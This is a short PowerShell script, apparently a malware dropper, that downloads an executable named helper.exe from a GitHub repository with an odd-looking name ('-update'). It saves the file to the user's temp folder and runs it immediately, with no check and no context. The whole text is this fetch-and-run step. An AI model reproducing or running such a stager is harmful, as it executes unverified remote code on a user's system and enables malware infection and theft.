$url = "https://github.com/FlatMelodyVise/-update/raw/refs/heads/main/helper.exe"
$path = "$env:Temp\helper.exe"
(New-Object System.Net.WebClient).DownloadFile($url, $path)
Start-Process -FilePath $path
